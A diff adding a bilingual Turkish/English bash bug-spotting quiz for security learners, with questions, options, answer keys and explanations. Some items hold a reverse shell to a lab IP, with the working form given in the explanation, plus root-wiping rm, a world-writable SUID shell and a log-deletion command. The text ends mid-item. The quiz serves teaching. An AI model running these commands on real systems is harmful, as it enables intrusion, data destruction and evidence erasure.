@@ -1,0 +1,1100 @@
+{
+  "difficulties": [
+    "beginner",
+    "intermediate",
+    "advanced",
+    "expert"
+  ],
+  "questions": {
+    "beginner": [
+      {
+        "topic": "basics",
+        "code": "rm -rf / tmp/test",
+        "options": [
+          {
+            "tr": "Bölü (/) işaretinden sonraki boşluk nedeniyle kök dizindeki her şeyi silmeye kalkışır!",
+            "en": "Space after slash (/) attempts to wipe the entire root filesystem!"
+          },
+          {
+            "tr": "rm komutunda -rf parametresi birlikte kullanılamaz",
+            "en": "Flags -rf cannot be combined in rm"
+          },
+          {
+            "tr": "tmp klasörünün başına mutlaka tilde (~) konulmalıdır",
+            "en": "tmp must be prefixed with tilde (~)"
+          },
+          {
+            "tr": "test bir dosya olduğu için -r gerekmez",
+            "en": "-r is unnecessary because test is a file"
+          }
+        ],
+        "answer": 0,
+        "bugError": "Fatal: space after root slash",
+        "explanation": {
+          "tr": "En meşhur ölümcül Linux hatasıdır! '/tmp/test' yerine arada boşluk bırakılarak '/ tmp/test' yazıldığında komut iki ayrı hedef görür: İlki '/' (kök dizin), ikincisi 'tmp/test'. Root yetkisiyle çalıştırılırsa tüm işletim sistemini siler.",
+          "en": "Accidental space between / and tmp makes rm treat / (root filesystem) as the first argument, obliterating the OS under root."
+        }
+      },
+      {
+        "topic": "basics",
+        "code": "cd /root\nls",
+        "options": [
+          {
+            "tr": "Normal kullanıcının /root dizinine girme veya okuma izni yoktur (Permission denied)",
+            "en": "Standard users lack permissions to enter or list /root (Permission denied)"
+          },
+          {
+            "tr": "cd komutundan sonra mutlaka nokta konmalıdır",
+            "en": "cd must be followed by a dot"
+          },
+          {
+            "tr": "ls yerine dir kullanılmalıdır",
+            "en": "dir must be used instead of ls"
+          },
+          {
+            "tr": "root dizini Linux'ta mevcut değildir",
+            "en": "root directory does not exist in Linux"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "/root dizini sadece süper kullanıcıya (root: 700 / rwx------) aittir. Normal bir kullanıcı (kali, user vb.) sudo olmadan 'cd /root' yapmaya çalışırsa 'Permission denied' hatası alır.",
+          "en": "/root is restricted to root (chmod 700). Unprivileged users receive 'Permission denied' without sudo."
+        }
+      },
+      {
+        "topic": "permissions",
+        "code": "chmod 777 id_rsa\nssh -i id_rsa root@10.10.10.5",
+        "options": [
+          {
+            "tr": "SSH, 777 izinli özel anahtarı 'Permissions are too open' diyerek güvenlik nedeniyle reddeder",
+            "en": "SSH refuses private key with 777 warning 'Permissions are too open'"
+          },
+          {
+            "tr": "777 izinli dosyalar çalıştırılamaz",
+            "en": "777 files cannot be executed"
+          },
+          {
+            "tr": "-i parametresi yerine -k kullanılmalıdır",
+            "en": "-k must be used instead of -i"
+          },
+          {
+            "tr": "IP adresi çift tırnak içine alınmalıdır",
+            "en": "IP address must be quoted"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "OpenSSH istemcisi güvenlik gereği özel anahtarların (private key) başkaları tarafından okunmasına izin vermez. 777 herkesin okuyup yazabileceği anlamına geldiğinden bağlantı reddedilir. Doğrusu: chmod 600 id_rsa.",
+          "en": "OpenSSH enforces strict key security: private keys accessible by others are rejected. Required permission is 600."
+        }
+      },
+      {
+        "topic": "piping",
+        "code": "cat file.txt > file.txt",
+        "options": [
+          {
+            "tr": "> yönlendirmesi cat çalışmadan önce dosyayı sıfırladığı için dosyanın içeriği tamamen silinir (0 bayt)",
+            "en": "> truncates the file before cat reads it, completely wiping the file content (0 bytes)"
+          },
+          {
+            "tr": "Dosya içeriği 2 katına çıkar",
+            "en": "File content doubles in size"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws a syntax error"
+          },
+          {
+            "tr": "Dosya salt okunur olur",
+            "en": "File becomes read-only"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Kabuk (shell), komutu çalıştırmadan önce yönlendirmeleri hazırlar. '>' gördüğü an hedef dosyayı sıfırlar (truncate). cat okumaya başladığında dosya zaten boştur!",
+          "en": "The shell executes redirection before launching cat, truncating the file to 0 bytes before reading occurs."
+        }
+      },
+      {
+        "topic": "basics",
+        "code": "mkdir my tools folder",
+        "options": [
+          {
+            "tr": "Tırnak kullanılmadığı için tek bir dizin yerine 'my', 'tools' ve 'folder' adında 3 ayrı dizin açılır",
+            "en": "Without quotes, creates 3 separate directories: 'my', 'tools', and 'folder'"
+          },
+          {
+            "tr": "Boşluklu isimlerde mkdir hata verip durur",
+            "en": "mkdir errors out on spaces"
+          },
+          {
+            "tr": "Sadece son kelime olan 'folder' dizinini açar",
+            "en": "Creates only the last directory 'folder'"
+          },
+          {
+            "tr": "Klasör adını alt çizgi ile birleştirir",
+            "en": "Auto-replaces spaces with underscores"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Bash boşlukları argüman ayırıcı olarak yorumlar. Tek bir dizin oluşturmak isteniyorsa tırnak içine alınmalıdır: mkdir \"my tools folder\" veya kaçış karakteri kullanılmalıdır: mkdir my\\ tools\\ folder.",
+          "en": "Spaces separate arguments in Bash. Unquoted, mkdir creates 3 separate directories instead of one."
+        }
+      },
+      {
+        "topic": "basics",
+        "code": "cp /etc/shadow backup/\ncat backup/shadow",
+        "options": [
+          {
+            "tr": "Normal kullanıcının /etc/shadow dosyasını okuma yetkisi yoktur (Permission denied)",
+            "en": "Standard user has no read permissions on /etc/shadow (Permission denied)"
+          },
+          {
+            "tr": "cp komutunda hedef dizin sonuna bölü konmaz",
+            "en": "Destination cannot end with slash"
+          },
+          {
+            "tr": "shadow dosyası kopyalanamaz bir dosyadır",
+            "en": "shadow file cannot be copied"
+          },
+          {
+            "tr": "cat ile shadow içeriği okunamaz",
+            "en": "cat cannot display shadow"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "/etc/shadow sistemdeki kullanıcı parolalarının tuzlanmış özetlerini (hash) tutar. Yalnızca root veya shadow grubu okuyabilir (640 / 000). Normal kullanıcı sudo olmadan okuyamaz ve kopyalayamaz.",
+          "en": "/etc/shadow stores password hashes and is strictly unreadable by regular users without root authority."
+        }
+      },
+      {
+        "topic": "basics",
+        "code": "touch \"file.txt\nls",
+        "options": [
+          {
+            "tr": "Kapanmamış çift tırnak nedeniyle kabuk alt satıra geçip ikinci tırnağı bekler (multiline quote)",
+            "en": "Unclosed double quote causes shell to wait for closing quote prompt (>)"
+          },
+          {
+            "tr": "file.txt başarıyla oluşturulur",
+            "en": "file.txt is successfully created"
+          },
+          {
+            "tr": "ls komutu hata verir",
+            "en": "ls command throws an error"
+          },
+          {
+            "tr": "Terminal donar ve kapanır",
+            "en": "Terminal freezes and closes"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Açılan tırnak kapatılmadığında Bash girdi modunda kalarak '>' prompt'u ile tırnağın kapanmasını bekler. İkinci komut olan 'ls' de tırnak içindeki metnin bir parçası gibi algılanır.",
+          "en": "Unterminated quote leaves Bash expecting the closing delimiter, absorbing 'ls' into the string literal."
+        }
+      },
+      {
+        "topic": "basics",
+        "code": "tar -czf my_folder archive.tar.gz",
+        "options": [
+          {
+            "tr": "-f parametresinden hemen sonra arşiv adı gelmelidir; bu komutta my_folder arşiv sanılarak üzerine yazılır!",
+            "en": "-f expects the archive filename immediately; here my_folder is treated as the archive and corrupted!"
+          },
+          {
+            "tr": "tar komutu klasörleri sıkıştıramaz",
+            "en": "tar cannot compress directories"
+          },
+          {
+            "tr": "-czf yerine -xzf yazılmalıdır",
+            "en": "-xzf must be used instead of -czf"
+          },
+          {
+            "tr": "archive.tar.gz uzantısı tar tarafından tanınmaz",
+            "en": "tar does not recognize .tar.gz"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "tar komutunda -f (file) parametresi arşiv dosyasının adını hemen ardındaki ilk argüman olarak bekler. Doğrusu: tar -czf archive.tar.gz my_folder. Bu hata orijinal klasörün bozulmasına veya boş bir dosya ile ezilmesine yol açabilir.",
+          "en": "Flag -f requires the target archive name immediately after it. Reversing arguments overwrites the source folder."
+        }
+      },
+      {
+        "topic": "bash_scripting",
+        "code": "export PATH=\"\"",
+        "options": [
+          {
+            "tr": "PATH ortam değişkeni boşaltıldığı için ls, cat gibi temel komutlar mutlak yolları (/bin/ls) olmadan çalışmaz",
+            "en": "Emptying PATH breaks standard command lookups (ls, cat) without absolute paths (/bin/ls)"
+          },
+          {
+            "tr": "Sistem anında kendini kapatır",
+            "en": "System shuts down immediately"
+          },
+          {
+            "tr": "Tüm dosya sistemi silinir",
+            "en": "Entire filesystem is deleted"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws a syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "PATH değişkeni kabuğun komutları nerede arayacağını belirler. PATH=\"\" yapıldığında 'ls' yazdığında 'command not found' alırsın; komutları '/bin/ls' veya '/usr/bin/cat' gibi tam yollarıyla çağırmak zorunda kalırsın.",
+          "en": "PATH tells the shell where binaries live. Setting it empty causes 'command not found' unless absolute paths are used."
+        }
+      },
+      {
+        "topic": "permissions",
+        "code": "chmod 888 exploit.sh",
+        "options": [
+          {
+            "tr": "Geçersiz izin modu: Sekizlik (octal) sistemde 8 rakamı bulunmaz (rakamlar 0-7 arasıdır)",
+            "en": "Invalid mode: Octal numbering allows digits 0-7 only; 8 does not exist"
+          },
+          {
+            "tr": "exploit.sh dosyasına süper yetki verir",
+            "en": "Grants super permissions to file"
+          },
+          {
+            "tr": "Dosyayı gizli yapar",
+            "en": "Hides the file"
+          },
+          {
+            "tr": "Dosya adını değiştirir",
+            "en": "Renames the file"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Linux dosya izinleri sekizlik (octal: taban 8) sayı tabanını kullanır. İzinler 0 (---) ile 7 (rwx) arasındadır. 8 rakamı sekizlik tabanda geçersizdir ve chmod 'invalid mode' hatası verir.",
+          "en": "Linux permissions use base-8 octal notation (0-7). The digit 8 is invalid in octal."
+        }
+      }
+    ],
+    "intermediate": [
+      {
+        "topic": "piping",
+        "code": "cat /etc/passwd | awk '{print $1}'",
+        "options": [
+          {
+            "tr": "Ayraç belirtilmediği için (varsayılan boşluktur), ':' ile ayrılmış satırın tamamını tek parça olarak basar",
+            "en": "Without field delimiter (-F:), defaults to whitespace, printing the entire colon-separated line"
+          },
+          {
+            "tr": "Sadece kullanıcı adlarını basar",
+            "en": "Prints only usernames"
+          },
+          {
+            "tr": "awk sözdizimi hatası verir",
+            "en": "awk throws syntax error"
+          },
+          {
+            "tr": "Boş satırlar yazdırır",
+            "en": "Prints empty lines"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "/etc/passwd alanları iki nokta üst üste (:) ile ayrılır. awk varsayılan olarak boşluk ve tab karakterlerini ayraç kabul eder. Bu yüzden satırda boşluk yoksa satırın tümünü $1 sayar. Doğrusu: awk -F: '{print $1}'.",
+          "en": "/etc/passwd fields are colon-delimited. By default, awk splits on spaces, requiring -F: to extract field 1 correctly."
+        }
+      },
+      {
+        "topic": "piping",
+        "code": "grep -r [0-9]{1,3}\\.[0-9]{1,3} /var/log/",
+        "options": [
+          {
+            "tr": "Gelişmiş düzenli ifade ({1,3}) kullanıldığı halde -E (extended regex) bayrağı eklenmemiştir",
+            "en": "Extended regex syntax ({1,3}) requires -E (extended regex) flag in standard grep"
+          },
+          {
+            "tr": "grep -r parametresi kabul etmez",
+            "en": "grep does not support -r"
+          },
+          {
+            "tr": "/var/log/ dizininde arama yapılamaz",
+            "en": "/var/log cannot be searched"
+          },
+          {
+            "tr": "Sözdiziminde hiçbir hata yoktur",
+            "en": "There is no error in syntax"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Standart grep temel düzenli ifadeleri (BRE) kullanır; { ve } karakterleri özel anlam taşımaz. Aralık belirteçleri için ya ters bölü (\\{1,3\\}) kullanılmalı ya da 'grep -E' (veya egrep) seçilmelidir.",
+          "en": "Basic grep (BRE) treats {} as literal characters. Extended quantifiers require 'grep -E' or escaping \\{\\}."
+        }
+      },
+      {
+        "topic": "privesc",
+        "code": "find / -perm -4000 -exec ls -la",
+        "options": [
+          {
+            "tr": "-exec parametresi sonlandırıcı karakter (\\; veya +) ile bitirilmemiştir: 'missing argument to -exec'",
+            "en": "-exec clause is missing terminator (\\; or +), producing 'missing argument to -exec'"
+          },
+          {
+            "tr": "ls -la yerine dir yazılmalıdır",
+            "en": "dir must be used instead of ls -la"
+          },
+          {
+            "tr": "-perm parametresinde eksi (-) işareti kullanılamaz",
+            "en": "Minus sign is forbidden in -perm"
+          },
+          {
+            "tr": "SUID araması find ile yapılamaz",
+            "en": "SUID search cannot be performed via find"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "find komutunun -exec parametresi her eşleşen dosya için bir komut çalıştırır ve komutun nerede bittiğini anlamak için sonuna mutlaka '\\;' veya '+' konulmasını şart koşar. Eksik olduğunda sözdizimi hatası verir.",
+          "en": "-exec requires a terminating delimiter (\\; or +). Omitting it causes find to abort with 'missing argument to -exec'."
+        }
+      },
+      {
+        "topic": "piping",
+        "code": "cat log.txt | uniq",
+        "options": [
+          {
+            "tr": "uniq komutu yalnızca ardışık (bitişik) tekrarları eler; dosya önce 'sort' ile sıralanmamıştır",
+            "en": "uniq only collapses adjacent duplicates; input was not pre-sorted with 'sort'"
+          },
+          {
+            "tr": "uniq dosyayı doğrudan silecektir",
+            "en": "uniq will delete the file"
+          },
+          {
+            "tr": "uniq komutu pipe ile çalışamaz",
+            "en": "uniq cannot read from pipe"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws a syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "uniq komutu ardışık olmayan tekrarları yakalayamaz. Dosyadaki tüm benzersiz satırları bulmak için daima önce sıralama yapılmalıdır: sort log.txt | uniq.",
+          "en": "uniq detects adjacent matching lines only. Non-consecutive duplicates remain unless piped after sort."
+        }
+      },
+      {
+        "topic": "bash_scripting",
+        "code": "if [ $NAME = \"admin\" ]; then\n  echo \"Giriş\"\nfi",
+        "options": [
+          {
+            "tr": "Eğer $NAME değişkeni boş veya tanımsız ise '[ = \"admin\" ]' haline gelir ve 'unary operator expected' hatası verir",
+            "en": "If $NAME is unset or empty, expands to '[ = \"admin\" ]', failing with 'unary operator expected'"
+          },
+          {
+            "tr": "if bloğunda then kullanılamaz",
+            "en": "then cannot be used in if blocks"
+          },
+          {
+            "tr": "= yerine == yazmak zorunludur",
+            "en": "== is mandatory instead of ="
+          },
+          {
+            "tr": "fi yerine endif yazılmalıdır",
+            "en": "endif must be used instead of fi"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Bash'te değişkenler tırnaksız bırakılırsa boş olduklarında yok olurlar. Çözüm değişkeni çift tırnak içine almaktır: [ \"$NAME\" = \"admin\" ] veya modern çift köşeli parantez kullanmaktır: [[ $NAME == \"admin\" ]].",
+          "en": "Unquoted variables vanish when empty. Quoting [ \"$NAME\" = ... ] or using [[ ... ]] prevents expansion syntax errors."
+        }
+      },
+      {
+        "topic": "networking",
+        "code": "nc -l 4444",
+        "options": [
+          {
+            "tr": "Netcat'te port belirtmek için -p bayrağı gereklidir (nc -l -p 4444 veya nc -lp 4444)",
+            "en": "Netcat requires -p to specify listening port (nc -lvnp 4444)"
+          },
+          {
+            "tr": "4444 portu Linux'ta dinlemeye açılamaz",
+            "en": "Port 4444 cannot be listened on in Linux"
+          },
+          {
+            "tr": "-l yerine -s yazılmalıdır",
+            "en": "-s must be used instead of -l"
+          },
+          {
+            "tr": "Sözdiziminde hiçbir hata yoktur",
+            "en": "There is no error in syntax"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Geleneksel netcat sürümlerinde port argümanı doğrudan verilemez; -p (port) bayrağı zorunludur: 'nc -lvnp 4444'. Sadece bazı OpenBSD varyantlarında -p atlanabilir.",
+          "en": "Traditional netcat implementations require the -p flag to designate the listening port."
+        }
+      },
+      {
+        "topic": "piping",
+        "code": "sed 's/test/prod/' file.txt",
+        "options": [
+          {
+            "tr": "Sondaki 'g' (global) bayrağı eksik olduğu için bir satırda birden fazla 'test' varsa sadece İLKİ değişir",
+            "en": "Missing trailing 'g' (global) flag only replaces the FIRST occurrence per line"
+          },
+          {
+            "tr": "sed sadece büyük harfli kelimeleri değiştirebilir",
+            "en": "sed can only replace uppercase words"
+          },
+          {
+            "tr": "file.txt dosyasını kalıcı olarak siler",
+            "en": "Permanently deletes file.txt"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "sed 's/eski/yeni/' her satırdaki yalnızca ilk eşleşmeyi değiştirir. Satırdaki tüm eşleşmeleri dönüştürmek için 'g' bayrağı eklenmelidir: sed 's/test/prod/g' file.txt.",
+          "en": "Without the 'g' modifier, sed substitutes strictly the first occurrence on each line."
+        }
+      },
+      {
+        "topic": "networking",
+        "code": "ping 10.10.10.1",
+        "options": [
+          {
+            "tr": "Linux'ta Windows'un aksine ping varsayılan olarak sonsuza kadar devam eder (-c parametresi verilmemiştir)",
+            "en": "Unlike Windows, Linux ping continues indefinitely without -c (count) limiter"
+          },
+          {
+            "tr": "Linux'ta ping komutu yerine ping6 kullanılmalıdır",
+            "en": "ping6 must be used in Linux"
+          },
+          {
+            "tr": "10.10.10.1 geçersiz bir IP adresidir",
+            "en": "10.10.10.1 is an invalid IP"
+          },
+          {
+            "tr": "Komut sözdizimi hatası verir",
+            "en": "Throws a syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Windows ping'i varsayılan olarak 4 paket gönderip durur. Linux'ta ise -c 4 gibi bir limit verilmezse kullanıcı Ctrl+C ile durdurana kadar sonsuz ping gönderir. Betiklerde komutun kilitlenmesine neden olur.",
+          "en": "Linux ping transmits packets endlessly unless capped via -c (e.g. ping -c 4 10.10.10.1)."
+        }
+      },
+      {
+        "topic": "basics",
+        "code": "grep -r \"flag\" * 2>&1 > /dev/null",
+        "options": [
+          {
+            "tr": "Yönlendirme sırası yanlıştır; hatalar (stderr) terminalde görünmeye devam eder",
+            "en": "Redirection order is wrong; stderr still prints to terminal"
+          },
+          {
+            "tr": "grep komutunda 2>&1 kullanılamaz",
+            "en": "2>&1 cannot be used with grep"
+          },
+          {
+            "tr": "Tüm sistem çöker",
+            "en": "Crashes the system"
+          },
+          {
+            "tr": "Dosyalar silinir",
+            "en": "Files are deleted"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Yönlendirmeler soldan sağa işlenir. '2>&1' önce stderr'i stdout'un o anki hedefine (terminal) kopyalar, ardından stdout /dev/null'a gider. Doğrusu: '> /dev/null 2>&1' veya modern Bash'te '&> /dev/null'.",
+          "en": "Shell redirects are evaluated left-to-right. 2>&1 must follow stdout redirection: '> /dev/null 2>&1'."
+        }
+      },
+      {
+        "topic": "bash_scripting",
+        "code": "COUNT=5\nCOUNT = COUNT + 1",
+        "options": [
+          {
+            "tr": "Eşittir (=) işaretinin etrafında boşluk bırakılamaz ve aritmetik için $((...)) kullanılmalıdır",
+            "en": "No spaces allowed around '=' in assignment, and arithmetic requires $((...))"
+          },
+          {
+            "tr": "Değişken adları sadece küçük harfle yazılabilir",
+            "en": "Variable names must be lowercase only"
+          },
+          {
+            "tr": "COUNT tırnak içine alınmalıdır",
+            "en": "COUNT must be quoted"
+          },
+          {
+            "tr": "Linux'ta değişken tanımlanamaz",
+            "en": "Variables cannot be declared in Linux"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Bash'te atama yapılırken eşittirin sağında veya solunda asla boşluk bırakılmaz. Boşluk bırakılırsa kabuk 'COUNT' isimli bir komut çalıştırmaya çalışır. Doğrusu: COUNT=$((COUNT + 1)).",
+          "en": "Bash treats tokens separated by spaces as commands and arguments. Variable assignment strictly forbids spaces around '='."
+        }
+      }
+    ],
+    "advanced": [
+      {
+        "topic": "crypto_tunnel",
+        "code": "bash -i > /dev/tcp/10.10.14.2/4444",
+        "options": [
+          {
+            "tr": "Stderr (&) ve Stdin (0>&1) yönlendirmesi eksiktir; kabuğa komut girilemez ve hatalar karşıya gitmez (tek yönlü)",
+            "en": "Missing stderr (&) and stdin (0>&1) redirection; shell is one-way and cannot receive user input"
+          },
+          {
+            "tr": "10.10.14.2 IP adresine TCP bağlantısı yapılamaz",
+            "en": "Cannot connect via TCP to IP"
+          },
+          {
+            "tr": "/dev/tcp Linux'ta hiçbir zaman desteklenmez",
+            "en": "/dev/tcp is never supported in Linux"
+          },
+          {
+            "tr": "bash yerine sh yazılmalıdır",
+            "en": "sh must be used instead of bash"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Tam bir ters kabuk için üç standart akışın da sokete bağlanması gerekir. '> /dev/tcp/...' sadece çıktıyı gönderir; klavyeden komut göndermek için stdin bağlantısı (0>&1) ve hatalar için stderr (> yerine >&) zorunludur: 'bash -i >& /dev/tcp/... 0>&1'.",
+          "en": "A functional reverse shell requires stdin and stderr bound to the network socket. Missing 0>&1 prevents receiving incoming keystrokes."
+        }
+      },
+      {
+        "topic": "security_recon",
+        "code": "nmap -sS -p- 10.10.10.5",
+        "options": [
+          {
+            "tr": "SYN Stealth Scan (-sS) ham soket gerektirdiğinden sudo/root yetkisi olmadan çalıştırılamaz",
+            "en": "SYN Stealth Scan (-sS) requires raw sockets and fails without root/sudo privileges"
+          },
+          {
+            "tr": "-p- geçersiz bir port aralığıdır",
+            "en": "-p- is an invalid port range"
+          },
+          {
+            "tr": "Nmap aynı anda tek port tarayabilir",
+            "en": "Nmap can only scan one port at a time"
+          },
+          {
+            "tr": "Sözdiziminde hiçbir hata yoktur",
+            "en": "There is no error in syntax"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "-sS (SYN scan), işletim sisteminin normal TCP el sıkışmasını baypas ederek ham ağ paketleri (raw sockets) oluşturur. Linux'ta ham soket oluşturma yetkisi (CAP_NET_RAW) yalnızca root kullanıcısına aittir. Normal kullanıcıda Nmap hata verir veya otomatik -sT (TCP connect) moduna düşer.",
+          "en": "SYN stealth scanning synthesizes raw TCP packets, requiring root privileges or CAP_NET_RAW capabilities."
+        }
+      },
+      {
+        "topic": "privesc",
+        "code": "chmod 4777 /tmp/rootshell",
+        "options": [
+          {
+            "tr": "SUID biti atanmış bir dosyaya 777 (world-writable) izni vermek, herhangi bir kullanıcının dosyayı değiştirip root olmasına izin veren dev bir güvenlik açığıdır",
+            "en": "Assigning 777 to a SUID file is a catastrophic blunder: any unprivileged user can overwrite it to gain root"
+          },
+          {
+            "tr": "4777 geçerli bir chmod parametresi değildir",
+            "en": "4777 is not a valid chmod mode"
+          },
+          {
+            "tr": "Dosya silinir",
+            "en": "The file gets deleted"
+          },
+          {
+            "tr": "SUID biti otomatik olarak iptal edilir",
+            "en": "SUID bit gets stripped automatically"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "4777: SUID biti açık VE herkes yazabilir (rwxrwxrwx). Bu durumda sistemdeki en düşük yetkili kullanıcı bile bu dosyanın içine kendi kodunu yazıp çalıştırarak anında root olur. SUID dosyaları asla 'diğerleri' tarafından yazılabilir olmamalıdır (4755 olmalıdır).",
+          "en": "A world-writable SUID file allows arbitrary code injection by any unprivileged user, granting instant root compromise."
+        }
+      },
+      {
+        "topic": "forensics",
+        "code": "grep -i \"password\" /var/log/auth.log.1.gz",
+        "options": [
+          {
+            "tr": "Gzip ile sıkıştırılmış arşiv dosyalarında 'grep' yerine 'zgrep' kullanılmalıdır",
+            "en": "Gzip-compressed log archives require 'zgrep' instead of standard 'grep'"
+          },
+          {
+            "tr": "auth.log.1.gz dosyası okunamaz",
+            "en": "auth.log.1.gz cannot be read"
+          },
+          {
+            "tr": "Gzip dosyalarında parola bulunamaz",
+            "en": "Passwords cannot be in gzip files"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Linux logrotate sistemi eski logları sıkıştırarak '.gz' uzantısıyla saklar. Standart grep ikili sıkıştırılmış dosyayı metin olarak okuyamaz. Arşivi açmadan doğrudan aramak için 'zgrep' komutu kullanılır.",
+          "en": "Rotated logs compressed with gzip cannot be parsed by plain grep; 'zgrep' or 'zcat | grep' must be employed."
+        }
+      },
+      {
+        "topic": "security_recon",
+        "code": "gobuster dir -u 10.10.10.50 -w wordlist.txt",
+        "options": [
+          {
+            "tr": "Gobuster URL parametresinde protokol belirtilmesini şart koşar (http:// veya https:// eksik)",
+            "en": "Gobuster strictly requires the URL scheme (http:// or https://) in -u"
+          },
+          {
+            "tr": "-w parametresi wordlist kabul etmez",
+            "en": "-w does not accept wordlist"
+          },
+          {
+            "tr": "dir yerine web yazılmalıdır",
+            "en": "web must be used instead of dir"
+          },
+          {
+            "tr": "Sözdiziminde hiçbir hata yoktur",
+            "en": "There is no error in syntax"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Gobuster -u parametresine doğrudan IP veya alan adı yazılırsa hata verir. Mutlaka 'http://10.10.10.50' veya 'https://10.10.10.50' şeklinde tam protokol belirtilmelidir.",
+          "en": "Gobuster mandates a complete URL including schema (e.g. http://10.10.10.50). Raw IPs trigger parsing errors."
+        }
+      },
+      {
+        "topic": "privesc",
+        "code": "echo \"* * * * * root /tmp/backup.sh\" > /etc/crontab",
+        "options": [
+          {
+            "tr": "'>' operatörü /etc/crontab dosyasının orijinal tüm içeriğini (PATH ve kritik sistem cronlarını) yok eder!",
+            "en": "'>' overwrites /etc/crontab, completely destroying all original system cron definitions and PATH!"
+          },
+          {
+            "tr": "crontab içine root yazılamaz",
+            "en": "root cannot be specified in crontab"
+          },
+          {
+            "tr": "Zaman formatında 5 yıldız kullanılamaz",
+            "en": "5 asterisks is invalid time format"
+          },
+          {
+            "tr": "/tmp/backup.sh çalıştırılamaz",
+            "en": "/tmp/backup.sh cannot be run"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "'>' yerine '>>' (append) kullanılmalıdır. /etc/crontab sıfırlandığında sistemin diğer tüm cron işleri ve varsayılan PATH ayarları silinir ve sistem kararsızlaşır.",
+          "en": "Using '>' overwrites the system crontab rather than appending (>>), wiping critical system maintenance tasks."
+        }
+      },
+      {
+        "topic": "crypto_tunnel",
+        "code": "scp -i id_rsa backup.tar user@10.10.10.5",
+        "options": [
+          {
+            "tr": "Hedef makinedeki varış yolu (ör. :~/ veya :/tmp/) belirtilmemiştir: 'user@10.10.10.5:/tmp'",
+            "en": "Missing destination directory path on remote target: 'user@10.10.10.5:/tmp'"
+          },
+          {
+            "tr": "scp komutunda -i kullanılamaz",
+            "en": "-i cannot be used in scp"
+          },
+          {
+            "tr": "backup.tar dosyası scp ile gönderilemez",
+            "en": "backup.tar cannot be sent via scp"
+          },
+          {
+            "tr": "Sözdiziminde hiçbir hata yoktur",
+            "en": "There is no error in syntax"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "SCP komutunda uzak hedefin sonuna iki nokta üst üste (:) ve hedef dizin konulmalıdır: 'scp -i id_rsa backup.tar user@10.10.10.5:/tmp'. İki nokta konulmazsa SCP hedefi yerel bir dosya sanır.",
+          "en": "SCP requires a colon delimiter followed by the remote directory path (e.g. user@host:/destination/path)."
+        }
+      },
+      {
+        "topic": "bash_scripting",
+        "code": "chown -R kali:kali *",
+        "options": [
+          {
+            "tr": "Joker karakter (*), tire (-) ile başlayan dosya isimlerini (ör. --reference=...) chown'un parametresi sanarak güvenlik açığına (Wildcard Injection) yol açar",
+            "en": "Wildcard (*) expands filenames beginning with dashes into command-line options (Wildcard Injection vulnerability)"
+          },
+          {
+            "tr": "chown -R parametresini desteklemez",
+            "en": "chown does not support -R"
+          },
+          {
+            "tr": "kali kullanıcısı Linux'ta mevcut değildir",
+            "en": "User kali does not exist"
+          },
+          {
+            "tr": "Sözdiziminde hiçbir hata yoktur",
+            "en": "There is no error in syntax"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Klasik bir 'Wildcard Injection' güvenlik açığıdır. Dizinde '--reference=/etc/shadow' adında bir dosya oluşturulursa chown bu dosyayı parametre sanır ve tüm dosyaların sahibini /etc/shadow'un sahibine çevirir. Önlem: 'chown -R kali:kali ./*' veya '-- *' kullanmaktır.",
+          "en": "Wildcard injection: filenames starting with dashes are parsed as options by utilities like chown, tar, and chmod."
+        }
+      },
+      {
+        "topic": "bash_scripting",
+        "code": "cat users.txt | while read user; do\n  ssh $user@host \"whoami\"\ndone",
+        "options": [
+          {
+            "tr": "ssh standart girdiyi (stdin) tüketerek 'while read' döngüsünün ilk satırdan sonra erken bitmesine neden olur (ssh -n gereklidir)",
+            "en": "ssh consumes standard input (stdin), causing while-read loop to terminate prematurely after line 1 (requires ssh -n)"
+          },
+          {
+            "tr": "ssh komutu döngü içinde kullanılamaz",
+            "en": "ssh cannot be invoked inside loops"
+          },
+          {
+            "tr": "while yerine for kullanılmalıdır",
+            "en": "for must be used instead of while"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "SSH varsayılan olarak terminalin stdin'ini okumaya çalışır ve users.txt dosyasının kalan tüm içeriğini yutar. Sonraki iterasyonda dosya biter. Çözüm: 'ssh -n $user@host' veya 'ssh < /dev/null' kullanmaktır.",
+          "en": "ssh drains stdin by default, exhausting the loop's input file on the very first cycle unless passed -n."
+        }
+      },
+      {
+        "topic": "forensics",
+        "code": "find /var/log -type f -exec rm -f {} \\;",
